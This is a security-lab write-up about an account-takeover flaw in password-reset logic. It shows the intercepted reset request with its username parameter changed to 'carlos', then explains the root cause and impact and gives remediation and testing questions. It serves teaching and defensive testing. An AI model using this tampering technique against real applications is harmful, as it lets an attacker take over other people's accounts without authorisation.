# Password Reset Broken Logic

## Overview

This lab demonstrates an **account takeover vulnerability caused by broken password-reset logic**.

The application issued a valid temporary password-reset token, but the final password-reset request also contained a client-controlled `username` parameter. The server validated that the reset token itself was valid, but failed to securely bind that token to the account for which it had originally been issued.

By intercepting the final password-reset request and changing the target username from the legitimate account to `carlos`, it was possible to reset Carlos's password without access to his email account or original password.

---

## Normal Password-Reset Flow

The legitimate recovery process consisted of:

```text
Request password reset
        |
        v
Receive reset link by email
        |
        v
Open /forgot-password?temp-forgot-password-token=<TOKEN>
        |
        v
Submit a new password
```

A temporary reset token was supplied in the reset link and reused during the final password-change request.

---

## Identifying the Vulnerable Request

After initiating a password reset for the controlled account, the final request used to set the new password was captured in Burp Suite and sent to Repeater.

The request had the following structure:

```http
POST /forgot-password?temp-forgot-password-token=<VALID_TOKEN> HTTP/2
Host: <lab-host>
Content-Type: application/x-www-form-urlencoded

 temp-forgot-password-token=<VALID_TOKEN>&username=wiener&new-password-1=peter&new-password-2=peter
```

The important observation was that two different pieces of identity-related information were supplied by the client:

```text
Reset token
Username
```

This raised the question of whether the server verified that the token was actually associated with the username submitted in the request.

---

## Hypothesis

A secure password-reset implementation should derive the target account from the reset token itself.

Conceptually:

```text
reset token
    |
    v
server-side lookup
    |
    v
specific user account
```

The client should not be able to independently choose another username.

The vulnerable request suggested that the application might instead perform two independent checks:

```text
Is the token valid?
        +
Which username did the client submit?
```

If the token was not bound to the supplied username, a valid reset token for one account could potentially be reused to reset another user's password.

---

## Exploitation

The captured request was sent to Burp Repeater.

The valid temporary password-reset token was left unchanged, while the `username` parameter was modified from the controlled user to the target account:

```diff
- username=wiener
+ username=carlos
```

A known new password was supplied:

```text
new-password-1=peter
new-password-2=peter
```

The manipulated request therefore became conceptually:

```http
POST /forgot-password?temp-forgot-password-token=<VALID_TOKEN> HTTP/2
Host: <lab-host>
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=<VALID_TOKEN>&username=carlos&new-password-1=peter&new-password-2=peter
```

The server accepted the request and reset Carlos's password.

Carlos could then be authenticated using the attacker-chosen password.

---

## Why the Attack Worked

The password-reset token was treated as proof that the requester was authorized to perform **a password reset**, but it was not securely tied to **which account** could be reset.

The vulnerable logic was effectively:

```text
valid reset token?
        |
        v
yes
        |
        v
read username from client request
        |
        v
reset that user's password
```

This creates an authorization gap inside the recovery workflow.

A secure implementation should instead behave like:

```text
valid reset token?
        |
        v
look up user associated with token
        |
        v
reset only that user's password
```

The client-controlled username should not determine the target account once the reset token has been issued.

---

## Root Cause

The root cause was **missing server-side binding between the password-reset token and the user account**.

The application trusted a client-supplied `username` parameter during the final password-reset step instead of deriving the account identity exclusively from trusted server-side reset-token state.

This is a form of broken authentication and workflow authorization logic.

The security property that was missing was:

```text
reset_token -> exactly one user
```

Instead, the application effectively allowed:

```text
valid reset_token + arbitrary username
```

---

## Impact

An attacker who can obtain a valid password-reset token for their own account can reset the password of another user.

Potential consequences include:

- complete account takeover;
- unauthorized access to sensitive account data;
- compromise of privileged users;
- bypass of the victim's existing password;
- bypass of control over the victim's email account;
- subsequent abuse of any functionality available to the compromised account.

In this lab, the vulnerability allowed the password of the `carlos` account to be changed to an attacker-controlled value.

---

## Remediation

Password-reset tokens must be strongly and unambiguously associated with exactly one user account on the server side.

Recommended controls include:

- Store the reset token together with the corresponding user identifier server-side.
- Derive the account being reset exclusively from the validated reset token.
- Do not trust client-supplied usernames, user IDs, or email addresses during the final reset operation.
- Make reset tokens cryptographically random and sufficiently long.
- Make tokens single-use and expire them after a short period.
- Invalidate existing reset tokens after a successful password change.
- Invalidate relevant active sessions where appropriate after a password reset.
- Apply consistent validation to every stage of the password-recovery workflow.

A secure final request should not require the client to specify the target user at all:

```http
POST /forgot-password?temp-forgot-password-token=<TOKEN>

new-password-1=<NEW_PASSWORD>&new-password-2=<NEW_PASSWORD>
```

The server should resolve the user internally from `<TOKEN>`.

---

## Testing Methodology

When assessing password-reset functionality, useful questions include:

```text
What identifies the account being reset?
Is that identity derived from the token or supplied by the client?
Can username, email, or user ID parameters be modified?
Is the reset token reusable across accounts?
Is the token single-use?
Does it expire?
Can parameters be removed or duplicated?
```

Password recovery should be treated as an alternative authentication mechanism and tested with the same scrutiny as the primary login flow.

---

## Key Takeaway

A valid password-reset token must authorize a reset for **one specific account**, not merely authorize the general action of resetting a password.

The key test in this lab was simple but high impact:

```text
Keep the valid reset token
        +
change the username parameter
```

If the server accepts the modified username, the recovery workflow can become a direct account-takeover primitive.
